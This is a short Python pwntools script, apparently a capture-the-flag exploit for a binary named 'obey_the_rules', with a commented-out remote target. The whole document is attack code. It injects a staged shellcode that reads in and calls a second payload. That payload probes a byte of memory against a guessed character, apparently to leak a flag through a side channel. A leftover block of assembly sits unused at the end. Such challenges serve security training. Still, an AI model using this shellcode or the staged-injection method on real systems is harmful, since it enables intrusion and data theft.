from pwn import *
actual=""
context.arch = 'amd64'
s=process("./obey_the_rules")
#s=remote("138.68.67.161", 20001)


gdb.attach(s,'b*0x0000000000400e0f\nc\nset $rax=0\nni')
shellcode = asm("""
                pop rsi
                xor edi, edi
                xor eax,eax
                syscall
                call rsi
"""
                )

print len(shellcode)
s.sendafter("Do you Obey? (yes / no)", "Y" + "\x00" + shellcode)



shellcode = asm("""
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                pop rax
                pop rax
                pop rax
                pop rax
                pop rax
                pop rax
                mov r9, rax
                add r9, {}
                mov al, {}
                cmp byte ptr [r9], al
                je correct
                jmp end

                correct: mov al, 0x59
                syscall

                end: int3
                ret

                nop""".format(0,ord("a")))


"""
                xor eax, eax
                mov al, 0x49
                syscall
                loop:jmp loop
                mov rdi, rax
                xor rsi,rsi
                inc rsi
                inc rsi
                xor eax,eax
                mov al,33
                syscall

"""
s.sendline(shellcode)
s.close()
